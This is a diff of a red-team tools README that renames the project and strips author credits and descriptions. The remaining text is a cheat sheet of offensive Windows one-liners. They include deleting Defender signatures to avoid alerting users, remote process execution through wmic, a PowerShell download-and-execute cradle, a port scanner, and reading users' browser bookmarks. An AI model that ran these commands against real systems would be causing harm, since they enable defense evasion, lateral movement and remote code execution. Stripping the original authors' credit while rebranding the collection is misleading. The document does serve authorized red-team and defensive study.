@@ -1,14 +1,11 @@
-# RedTeam-Tools
+# SaiLakshman
 
-<p align="center">
-<img src="https://user-images.githubusercontent.com/100603074/210680426-20a92131-56f9-43ad-be82-f449e3215dda.png" height="300">
-</p>
 
-This github repository contains a collection of **130+** **tools** and **resources** that can be useful for **red teaming activities**. 
+
+This github repository contains a collection of **130+** **tools** and **resources** that can be useful for **SaiLakshman**. 
 
 Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.
 
-> 🔗 If you are a Blue Teamer, check out [BlueTeam-Tools](https://github.com/A-poc/BlueTeam-Tools)
 
 > **Warning** 
 > 
@@ -282,24 +279,16 @@ Some of the tools may be specifically designed for red teaming, while others are
     </ul>
 </details>
     
-Red Team Tips
+
 ====================
 
-*Learn from Red Teamers with a collection of Red Teaming Tips. These tips cover a range of tactics, tools, and methodologies to improve your red teaming abilities.*
-
-**Note:** *Nearly all tips are currently from [@Alh4zr3d](https://twitter.com/Alh4zr3d), he posts good Red Team Tips!*
 
 ### [🔙](#tool-list)Hiding the local admin account
 
-```bash
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v alh4zr3d /d 0 /f
-```
+
 
 **Description:** *'Creating accounts is risky when evading blue, but when creating a local admin, use some cute sorcery in the registry to hide it.'*
 
-**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
-
-**Link:** [Twitter](https://twitter.com/Alh4zr3d/status/1612913838999113728)
 
 ### [🔙](#tool-list)Cripple windows defender by deleting signatures
 
@@ -307,11 +296,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
 "%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 ```
 
-**Description:** *'A bit messy, but if Windows Defender is causing you a big headache, rather than disabling it (which alerts the user), you should just neuter it by deleting all the signatures.'*
-
-**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
-
-**Link:** [Twitter](https://twitter.com/Alh4zr3d/status/1611005101262389250)
 
 ### [🔙](#tool-list)Enable multiple RDP sessions per user
 
@@ -319,11 +303,6 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
 reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f
 ```
 
-**Description:** *'Sometimes you want to log in to a host via RDP or similar, but your user has an active session. Enable multiple sessions per user.'*
-
-**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
-
-**Link:** [Twitter](https://twitter.com/Alh4zr3d/status/1609954528425558016)
 
 ### [🔙](#tool-list)Sysinternals PsExec.exe local alternative
 
@@ -331,11 +310,7 @@ reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPe
 wmic.exe /node:10.1.1.1 /user:username /password:pass process call create cmd.exe /c " command "
 ```
 
-**Description:** *'Are you tired of uploading Sysinternals PsExec.exe when doing lateral movement? Windows has a better alternative preinstalled. Try this instead.'*
 
-**Credit:** [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux)
-
-**Link:** [Twitter](https://twitter.com/GuhnooPlusLinux/status/1607473627922063360)
 
 ### [🔙](#tool-list)Live off the land port scanner
 
@@ -343,11 +318,7 @@ wmic.exe /node:10.1.1.1 /user:username /password:pass process call create cmd.ex
 0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(<tgt_ip>,$_)) "Port $_ open"} 2>$null
 ```
 
-**Description:** *'When possible, live off the land rather than uploading tools to machines (for many reasons). PowerShell/.NET help. Ex: simple port scanner in Powershell.'*
 
-**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
-
-**Link:** [Twitter](https://twitter.com/Alh4zr3d/status/1605060950339588096)
 
 ### [🔙](#tool-list)Proxy aware PowerShell DownloadString
 
@@ -355,11 +326,6 @@ wmic.exe /node:10.1.1.1 /user:username /password:pass process call create cmd.ex
 $w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")
 ```
 
-**Description:** *'Most large orgs are using web proxies these days. The standard PowerShell download cradle is not proxy aware. Use this one.'*
-
-**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
-
-**Link:** [Twitter](https://twitter.com/Alh4zr3d/status/1596192664398966785)
 
 ### [🔙](#tool-list)Looking for internal endpoints in browser bookmarks
 
@@ -367,11 +333,6 @@ $w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::Defaul
 type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"
 ```
 
-**Description:** *'You'd be surprised what you can find out from a user's bookmarks alone. Internal endpoints they can access, for instance.'*
-
-**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
-
-**Link:** [Twitter](https://twitter.com/Alh4zr3d/status/1595488676389171200)
 
 ### [🔙](#tool-list)Query DNS records for enumeration
 
@@ -379,11 +340,6 @@ type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmark
 Get-DnsRecord -RecordType A -ZoneName FQDN -Server <server hostname>
 ```
 
-**Description:** *'Enumeration is 95% of the game. However, launching tons of scans to evaluate the environment is very loud. Why not just ask the DC/DNS server for all DNS records?'*
-
-**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
-
-**Link:** [Twitter](https://twitter.com/Alh4zr3d/status/1587132627823181824)
 
 ### [🔙](#tool-list)Unquoted service paths without PowerUp
 
@@ -391,11 +347,7 @@ Get-DnsRecord -RecordType A -ZoneName FQDN -Server <server hostname>
 Get-CIMInstance -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
-**Description:** *'Finding unquoted service paths without PowerUp'*
 
-**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
-
-**Link:** [Twitter](https://twitter.com/Alh4zr3d/status/1579254955554136064)
 
 ### [🔙](#tool-list)Bypass a disabled command prompt with /k
 
